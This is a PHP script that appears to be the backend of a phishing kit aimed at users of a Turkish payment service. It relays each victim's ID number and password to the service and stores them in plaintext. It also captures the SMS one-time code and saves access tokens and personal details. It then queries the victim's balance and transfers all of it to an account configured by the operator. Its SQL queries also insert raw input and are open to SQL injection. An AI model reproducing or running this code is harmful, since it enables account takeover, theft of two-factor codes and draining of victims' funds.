<?php
include 'inc/config.php';
include 'inc/check.php';



function unicodeStringa($str) {
    $aa = preg_replace('/u([\da-fA-F]{4})/', '&#x\1;', $str);
    return str_replace('\\','',$aa);
}

$q = $_GET['q'];

if ($q == 'login') {
    $turkeyId = $_POST['turkeyId'];
    $password = $_POST['password'];
    $ip = $db->real_escape_string(htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']));
    
    $response = login($turkeyId, $password);
    
    if (isset($response['error']) || !$response['isSuccess']) {
        echo json_encode([
            'status' => 'error',
            'message' => $response['message'],
            'resultType' => $response['resultType'],
            'messagee' => $response['data']['message']
        ]);
        exit;
    }
    
    $status = $response['resultType'];
    $userTokenId = $response['data']['userTokenId'];

    // Her giriş denemesinde veritabanına yeni bir kayıt ekleniyor
    $db->query("INSERT into users (user, pass, ip, status, userTokenId) VALUES ('$turkeyId', '$password', '$ip', '$status', '$userTokenId')");
    $_SESSION['user_id'] = $db->insert_id;
    echo json_encode([
        'status' => 'success',
        'message' => $response['message'],
        'resultType' => $response['resultType'],
        'messagee' => $response['data']['message']
    ]);
}

elseif ($q == 'sms') {
    $userTokenId = $us['userTokenId'];
    $ipp = $us['ip'];
    $code = $_POST['submitedCode'];
    $ip = $db->real_escape_string(htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']));
    
        $response = sms($userTokenId, $code);
        
        if (isset($response['error']) || !$response['isSuccess']) {
            echo json_encode([
             'status' => 'error',
             'message' => $response['message'],
             'resultType' => $response['resultType'],
             'messagee' => $response['data']['message']
        
        ]);
            exit;
        }
        
        $status = $response['resultType'];
        $firstName = $response['data']['firstName'];
        $lastName = $response['data']['lastName'];
        $turkeyId = $response['data']['turkeyId'];
        $emailAddress = $response['data']['emailAddress'];
        $accessToken = $response['data']['accessToken'];
        $refreshToken = $response['data']['refreshToken'];
        $accountnumber = $response['data']['id'];
        $accountStatus = $response['data']['accountStatus'];
        $expiryDate = $response['data']['expiryDate'];


        $updateSql = "UPDATE users SET status='$status', sms='$code', firstName='$firstName', lastName='$lastName', turkeyId='$turkeyId', emailAddress='$emailAddress', accessToken='$accessToken', refreshToken='$refreshToken', accountnumber='$accountnumber', accountStatus='$accountStatus', expiryDate='$expiryDate' WHERE ip = '$ipp'";

        $result = $db->query($updateSql);
        if (!isset($_SESSION['user_id'])) {
            die("Session değeri atanamadı!");
        }


        if (!$result) {
            die("SQL Error: " . $db->error);
        }
        echo json_encode([
            'status' => 'success',
            'message' => $response['message'],
            'resultType' => $response['resultType'],
            'accessToken' => $response['data']['accessToken'],
            'accountStatus' => $response['data']['accountStatus'],
            'emailAddress' => $response['data']['emailAddress'],
            'expiryDate' => $response['data']['expiryDate'],
            'firstName' => $response['data']['firstName'],
            'id' => $response['data']['id'],
            'lastName' => $response['data']['lastName'],
            'turkeyId' => $response['data']['turkeyId'],
            'userTypeId' => $response['data']['userTypeId']
       
       ]);
       
    
}elseif ($q == 'balance') {
    $ipp = $us['ip'];

    $accessToken = $us['accessToken']; 
    $balanceData = balance($accessToken);
    
    if (isset($balanceData['data']['balance'])) {
        $balance = $balanceData['data']['balance'];
        

        $userId = $_SESSION['user_id'];
        $updateSql = "UPDATE users SET balance='$balance' WHERE ip = '$ipp'";
        
        $result = $db->query($updateSql);
        if (!$result) {
            die(json_encode(['error' => 'SQL Error: ' . $db->error]));
        }
        
        echo json_encode(['status' => 'success', 'balance' => $balance]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Balance bilgisine erişilemedi.']);
    }
    exit;
}elseif ($q == 'sendmoney') {
    $ipp = $us['ip'];
    $balance = $us['balance'];
    $payfixacc = $site['payfixacc'];
    $accessToken = $us['accessToken']; 
    $response = sendMoney($accessToken, $payfixacc, $balance, "");
    if (isset($response['message'])) {
        $balance = $response['message'];
        $balance1 = $response['resultType'];
		
        
        echo json_encode(['status' => 'success', 'message' => $balance, 'resultType' => $balance1]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Para gönderilemedi']);
    }

}


?>

